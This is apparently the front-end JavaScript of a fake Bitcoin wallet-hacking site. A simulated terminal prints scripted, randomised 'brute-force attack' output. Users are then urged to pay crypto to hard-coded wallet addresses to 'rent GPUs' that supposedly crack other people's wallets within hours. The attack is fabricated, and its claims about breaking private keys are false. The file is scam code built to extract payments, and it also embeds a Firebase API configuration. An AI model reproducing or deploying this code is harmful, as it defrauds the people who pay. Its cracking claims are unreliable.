// Firebase Setup
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js";


const firebaseConfig = {
    apiKey: "AIzaSyD2-ugXKK5jWRK754ufSoVwKd-4ByS5D5A",

    authDomain: "eventgum-a8842.firebaseapp.com",

    projectId: "eventgum-a8842",

    storageBucket: "eventgum-a8842.firebasestorage.app",

    messagingSenderId: "919375008878",

    appId: "1:919375008878:web:c2488412d8197586cf027f",

    measurementId: "G-LGHVLM6P8R"

};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);


let priceMap = {}; // To store fetched prices

// DOM Elements
const terminalOutput = document.getElementById("terminal-output");
const gpuList = document.getElementById("gpu-list");
const paymentModal = document.getElementById("payment-modal");
const paymentWallet = document.getElementById("payment-wallet");
const paymentAmount = document.getElementById("payment-amount");
const disclaimerModal = document.getElementById("disclaimer-modal");
const terminalSimulation = document.getElementById("terminal-simulation");
const mainUI = document.getElementById("main-ui");
const proceedButton = document.getElementById("proceed-button");
const acceptTerms = document.getElementById("accept-terms");
const closePaymentButton = document.getElementById("close-payment");
const authModal = document.getElementById("auth-modal");
const authForm = document.getElementById("auth-form");
const switchAuth = document.getElementById("switch-auth");
const authTitle = document.getElementById("auth-title");
const authSubmit = document.getElementById("auth-submit");
const emailInput = document.getElementById("email");
const passwordInput = document.getElementById("password");
const userEmail = document.getElementById("user-email");

const loadingScreen = document.getElementById("loading-screen");
const paymentMessage = document.getElementById("payment-message");

let selectedGPU = null;
let isSignup = false;

// Wallet generation and listener setup
const lonerWallets = {
    "Bitcoin(BTC)": {
        addr: "bc1qst7le86087zvg2gx2yalj8rq2epxrfdjwl4sjq",
        msg: "Send {AMOUNT} Bitcoin(BTC) to the above wallet address. You can click the wallet address to copy it."
    },
    "Ethereum(ETH)": {
        addr: "0x7a6ed5e7c990A400E29F77fD7D711b59450a335a",
        msg: "Send {AMOUNT} Ethereum(ETH) to the above wallet address. You can click the wallet address to copy it."
    },
    "BNB": {
        addr: "0x7a6ed5e7c990A400E29F77fD7D711b59450a335a",
        msg: "Send {AMOUNT} Binance Smart Chain BNB to the above wallet address. You can click the wallet address to copy it."
    },
    "Tron(TRX)": {
        addr: "TTTkP1mjkXEZcv4GSrg2KHFnRL1BmmKJXN",
        msg: "Send {AMOUNT} Tron(TRX) to the above wallet address. You can click the wallet address to copy it."
    },
    "Solana": {
        addr: "8PPkMbQP6KnYqPeDxGjCGtD23ZF9q8BHmehBSMuM5VsS",
        msg: "Send {AMOUNT} Solana(SOL) to the above wallet address. You can click the wallet address to copy it."
    },
    "USDT on Binance Smart Chain": {
        addr: "0x7a6ed5e7c990A400E29F77fD7D711b59450a335a",
        msg: "Send ${AMOUNT} Binance Smart Chain USDT to the above wallet address. You can click the wallet address to copy it."
    },
    "USDT on Tron blockchain": {
        addr: "TTTkP1mjkXEZcv4GSrg2KHFnRL1BmmKJXN",
        msg: "Send ${AMOUNT} Tron USDT to the above wallet address. You can click the wallet address to copy it."
    },
};

const coinPriceKeyMap = {
    "Bitcoin(BTC)": "bitcoin",
    "Ethereum(ETH)": "ethereum",
    "BNB": "binancecoin",
    "Tron(TRX)": "tron",
    "Solana": "solana"
};

const CURRENCY_SYMBOLS = {
    "Bitcoin(BTC)": "BTC",
    "Ethereum(ETH)": "ETH",
    "BNB": "BNB",
    "Tron(TRX)": "TRX",
    "Solana": "SOL",
    "USDT on Binance Smart Chain": "USDT",
    "USDT on Tron blockchain": "USDT",
}

const gpuOptions = [
    {
        name: "NVIDIA RTX 4090",
        speed: "10x",
        price: 0.1, // BTC
        priceUSD: 75.98, // Rental price in USD
        timeToBreakWallet: "5 hours", // Faster GPU,
    },
    {
        name: "AMD RX 7900 XTX",
        speed: "8x",
        price: 0.08, // BTC
        priceUSD: 56.48, // Rental price in USD
        timeToBreakWallet: "11.25 hours", // Slower than RTX 4090
    },
    {
        name: "NVIDIA RTX 4070",
        speed: "6x",
        price: 0.06, // BTC
        priceUSD: 28.73, // Rental price in USD
        timeToBreakWallet: "2.23 days", // Slower
    }
];


const hdWalletSeedKey = "wallet-seed";
const paymentKey = "gpu-payment-status";

// Disclaimer Modal Logic
acceptTerms.addEventListener("change", () => {
    proceedButton.disabled = !acceptTerms.checked;
    console.log("acceptTerms", !acceptTerms.checked)
});

proceedButton.addEventListener("click", () => {
    disclaimerModal.style.display = "none";
    proceedButton.disabled = !acceptTerms.checked;
    if (auth.currentUser) {
        startTerminalSimulation();
    } else {
        authModal.classList.remove("hidden");
    }
});

const showMain = () => {
    mainUI.classList.remove("hidden");
    showGPUOptions();
}

// Firebase Authentication Logic
function toggleAuth(){
    isSignup = !isSignup;
    authTitle.textContent = isSignup ? "Sign Up" : "Sign In";
    authSubmit.textContent = isSignup ? "Sign Up" : "Sign In";
    switchAuth.innerHTML = isSignup
        ? "If you already have an account, <span id=\"switch-to-signup\">Click here to Sign In</span>"
        : "If you don't have an account yet, <span id=\"switch-to-signup\">Click here to Sign Up</span>";
    attachToggleEvent()
}

function attachToggleEvent() {
    const switchToSignup = document.querySelector("#switch-to-signup");
    switchToSignup.addEventListener("click", toggleAuth);
}

attachToggleEvent()

authForm.addEventListener("submit", (e) => {
    e.preventDefault();
    const email = emailInput.value;
    const password = passwordInput.value;
    authSubmit.textContent = "Please wait..."
    authSubmit.classList.add("disable")

    if (isSignup) {
        createUserWithEmailAndPassword(auth, email, password)
        .then(() => {
            Swal.fire("Signup successful.");
            isSignup = false;
            authModal.classList.add("hidden");
            authSubmit.textContent = "Sign Up"
            authSubmit.classList.remove("disable")
            startTerminalSimulation();
        })
        .catch((error) => Swal.fire(error.message));
    } else {
        signInWithEmailAndPassword(auth, email, password)
        .then(() => {
            authModal.classList.add("hidden");
            authSubmit.textContent = "Sign In"
            authSubmit.classList.remove("disable")
            startTerminalSimulation();
        })
        .catch((error) => Swal.fire(error.message));
    }
});

onAuthStateChanged(auth, (user) => {
    if (user) {
        userEmail.textContent = user.email;
        //disclaimerModal.classList.add("hidden");
    }
});

function generateRandomID(size) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let randomID = '';
    for (let i = 0; i < size; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        randomID += characters[randomIndex];
    }
    return randomID;
}

function getRandomNumberInRange(min, max) {
    if (min > max) {
        throw new Error("The 'min' value cannot be greater than the 'max' value.");
    }
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Terminal Simulation Logic
function startTerminalSimulation() {
    //showMain();
    //return
    terminalSimulation.classList.remove("hidden");

    const id = generateRandomID(8)
    const clusters = getRandomNumberInRange(4000, 50000)

    const pct = getRandomNumberInRange(10, 15)
    const cluster = Math.round((pct * clusters) / 100)
    const selected = getRandomNumberInRange(10000000, 99999999)

    const commands = [
        {
            command: "wsearch -m 20000 -s 100000000000000",
            results_info: [
                { info: "Visiting blockchain.com...", time_taken: 2 },
                { info: "Fetching BTC transactions history...", time_taken: 5 },
                { info: "Filtering BTC wallets with a minimum of $20,000...", time_taken: 5 },
                { info: `${selected} wallets selected...`, time_taken: 2 },
            ],
        },
        {
            command: `pkgroup -b ${id}`,
            results_info: [
                { info: "Grouping 2^256 private key permutations into attack clusters...", time_taken: 5 },
            ],
        },
        {
            command: `pkattack -f ./clusters_map_${id}.json -c ./clusters_${id}`,
            results_info: [
                { info: "Executing pkattack to detect weak clusters...", time_taken: 5 },
                { info: `${clusters} weak clusters found....`, time_taken: 2 },
            ],
        },
        {
            command: `clsort -f weak_clusters_${id}.json`,
            results_info: [
                { info: "Executing clsort command to retrieve the weakest cluster...", time_taken: 5 },
                { info: `Cluster ${cluster} picked as the weakest cluster...`, time_taken: 2 },
            ],
        },
        {
            command: `deploy_attack -n ${cluster}`,
            results_info: [
                { info: `Preparing private keys bruteforce attack on the selected cluster, ${cluster}...`, time_taken: 5 },
                { info: `Fetching ${auth.currentUser.email} GPUs to deploy cluster ${cluster} attack on...`, time_taken: 2 },
                { info: `No GPU found for ${auth.currentUser.email}...`.toUpperCase(), time_taken: 2, color: "#FF0000", append: "<span>&#9888; </span>" },
                { info: `Starting the interactive bruteforce web app to assign a GPU to ${auth.currentUser.email}...`, time_taken: 5 },
            ],
        },
    ];

    let commandIndex = 0;

    function executeCommand() {
        if (commandIndex < commands.length) {
            const { command, results_info } = commands[commandIndex];
            const tm = document.createElement("div");
            tm.innerHTML = `<span>$> ${command}</span><br/>`;
            terminalOutput.appendChild(tm);
            //terminalOutput.textContent += `> ${command}\n`;

            let resultIndex = 0;

            function displayResult() {
                if (resultIndex < results_info.length) {
                    const { info, time_taken, append, color } = results_info[resultIndex];
                    const resultElement = document.createElement("div");
                    resultElement.innerHTML = `<span ${color? `style="color:${color}"` : ""}>${append? append : ""}${info} <span class="cursor">|</span></span><br/>`;
                    terminalOutput.appendChild(resultElement);

                    const cursor = resultElement.querySelector(".cursor");
                    animateCursor(cursor);

                    setTimeout(() => {
                        cursor.remove(); // Remove the cursor after the time_taken
                        resultIndex++;
                        displayResult();
                    }, time_taken * 1000);
                    
                } else {
                    commandIndex++;
                    executeCommand();
                }
            }

            displayResult();
        } else {
            setTimeout(() => {
                terminalSimulation.classList.add("hidden");
                showMain()
            }, 1000);
        }
    }

    executeCommand();
}

// Cursor Animation Logic
function animateCursor(cursor) {
    let visible = true;
    setInterval(() => {
        visible = !visible;
        cursor.style.visibility = visible ? "visible" : "hidden";
    }, 500); // Blinks every 500ms
}

// Populate Payment Selection Dropdown
function populatePaymentOptions() {
    const paymentMethodSelect = document.getElementById("payment-method");

    // Clear existing options
    paymentMethodSelect.innerHTML = '<option value="" disabled selected>Select a payment method</option>';

    // Populate options from lonerWallets
    for (const [coin, wallet] of Object.entries(lonerWallets)) {
        const option = document.createElement("option");
        option.value = coin; // Use coin type as value
        option.textContent = coin; // Display coin type
        paymentMethodSelect.appendChild(option);
    }
}

// Handle Payment Selection Change
/*
function handlePaymentSelection() {
    const paymentMethodSelect = document.getElementById("payment-method");
    const paymentWallet = document.getElementById("payment-wallet");
    const paymentMessage = document.getElementById("payment-message");
    const paymentInfo = document.getElementById("payment-info");
    const confirmPaymentButton = document.getElementById("confirm-payment");

    paymentMethodSelect.addEventListener("change", (e) => {
        const selectedCoin = e.target.value;

        if (lonerWallets[selectedCoin]) {
            // Update wallet address and message
            paymentWallet.textContent = lonerWallets[selectedCoin].addr;
            paymentMessage.textContent = lonerWallets[selectedCoin].msg;

            // Show payment info and confirm button
            paymentInfo.classList.remove("hidden");
            //confirmPaymentButton.classList.remove("hidden");
        } else {
            // Hide payment info and confirm button if invalid selection
            paymentInfo.classList.add("hidden");
            //confirmPaymentButton.classList.add("hidden");
        }
    });
}*/

// Confirm Payment Button Logic
function handleConfirmPayment() {
    const confirmPaymentButton = document.getElementById("confirm-payment");
    const paymentMethodSelect = document.getElementById("payment-method");

    confirmPaymentButton.addEventListener("click", () => {
        const selectedCoin = paymentMethodSelect.value;

        if (lonerWallets[selectedCoin]) {
            Swal.fire(
                `Payment Confirmed!`,
                `Send your payment to the wallet address shown for ${selectedCoin}.`,
                "success"
            );
            paymentModal.classList.add("hidden");
        } else {
            Swal.fire("Error", "Please select a valid payment method.", "error");
        }
    });
}

// Initialize Payment Modal
function initializePaymentModal() {

    populatePaymentOptions();
    handlePaymentSelection();
    handleConfirmPayment();
}

// Close Payment Modal
closePaymentButton.addEventListener("click", () => {
    paymentModal.classList.add("hidden");
});

// Show bruteforce Screen
function showBruteForceScreen() {
    mainUI.innerHTML = `
        <h1>Brute Forcing Wallet...</h1>
        <p><strong>GPU:</strong> ${selectedGPU.name}</p>
        <p><strong>Status:</strong> Running bruteforce attack...</p>
        <p>Welcome, <strong>${auth.currentUser.email}</strong></p>
    `;
}

document.getElementById("payment-wallet").addEventListener("click", () => {
    const walletAddress = document.getElementById("payment-wallet").textContent;
    navigator.clipboard.writeText(walletAddress).then(() => {
        Swal.fire("Copied!", "Wallet address copied.", "success");
    });
});

// Fetch Prices and Update UI
const fetchAndUpdatePrices = async () => {
    try {
        const response = await fetch(
            "https://api.coingecko.com/api/v3/simple/price?ids=binancecoin,ethereum,bitcoin,solana,tron&vs_currencies=usd"
        );
        priceMap = await response.json();
        //console.log("response", ":", priceMap)

        // Update the UI with the new prices
        updatePaymentAmounts();
        displayWalletInfo();
    } catch (error) {
        console.error("Error fetching prices:", error.message);
    }
};

// Update Payment Amounts
const updatePaymentAmounts = () => {
    const paymentMethodSelect = document.getElementById("payment-method");
    const paymentInfo = document.getElementById("payment-info");
    const selectedCoin = paymentMethodSelect.value;

    if (!selectedCoin) return;

    const gpuPrice = selectedGPU.priceUSD || selectedGPU.price; // USD price or direct coin amount
    const coinPriceKey = coinPriceKeyMap[selectedCoin] || null;

    console.log("priceMap[coinPriceKey]", priceMap, coinPriceKey, priceMap[coinPriceKey])
    // Calculate amount to pay in the selected cryptocurrency
    const amountToPay = coinPriceKey ? (gpuPrice / priceMap[coinPriceKey].usd).toFixed(8) : gpuPrice.toFixed(2);

    // Update the payment modal UI
    paymentAmount.textContent = `${amountToPay} ${CURRENCY_SYMBOLS[selectedCoin]}`;
    paymentMessage.textContent = lonerWallets[selectedCoin].msg.replace("{AMOUNT}", amountToPay);
    // Show payment info and confirm button
    paymentInfo.classList.remove("hidden");
};

// Show Loading Screen
const showLoadingScreen = () => {
    loadingScreen.classList.remove("hidden");
};

// Hide Loading Screen
const hideLoadingScreen = () => {
    loadingScreen.classList.add("hidden");
};

// Initialize Application
const initApp = async () => {
    showLoadingScreen();

    // Fetch prices and initialize the app
    await fetchAndUpdatePrices();

    hideLoadingScreen();
    setInterval(fetchAndUpdatePrices, 30000); // Refresh prices every 30 seconds
};

// Handle Payment Selection
function handlePaymentSelection() {
    const paymentMethodSelect = document.getElementById("payment-method");

    paymentMethodSelect.addEventListener("change", (e) => {
        const selectedCoin = e.target.value;

        if (lonerWallets[selectedCoin]) {
            paymentWallet.textContent = lonerWallets[selectedCoin].addr;
            updatePaymentAmounts();
        }
    });
}

// Open Payment Modal
function openPaymentModal() {
    paymentModal.classList.remove("hidden");
    populatePaymentOptions();
    handlePaymentSelection();
}

// GPU Selection Logic
function showGPUOptions() {
    gpuList.innerHTML = ""
    gpuOptions.forEach((gpu) => {
        const card = document.createElement("div");
        card.classList.add("gpu-card");
        card.innerHTML = `
            <div style="100%;padding: 10px;margin:10px;border:1px solid #0f0;background: #111">
                <h3>${gpu.name}</h3>
                <p>Speed: Hacks wallet in ${gpu.timeToBreakWallet}</p>
                <p>Rent Cost: $${gpu.priceUSD.toFixed(2)}</p>
                <button class="select-gpu">Rent GPU</button>
            </div>
        `;

        card.querySelector(".select-gpu").addEventListener("click", () => {
            selectedGPU = gpu;
            openPaymentModal();
        });

        gpuList.appendChild(card);
    });
}

// Generate Random Wallet Amount
function getRandomWalletAmount() {
    return (Math.random() * (2.5 - 1.5) + 1.5).toFixed(8); // Random between 1.5 and 2.5
}

// Display Wallet Info
function displayWalletInfo() {
    const walletAmountBTC = getRandomWalletAmount();
    const walletAmountUSD = walletAmountBTC * priceMap.bitcoin.usd;

    document.getElementById("wallet-amount").textContent = `${walletAmountBTC}BTC ($${walletAmountUSD.toLocaleString("en", {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
    })})`;
}

// Initialize the Application on Load
initApp();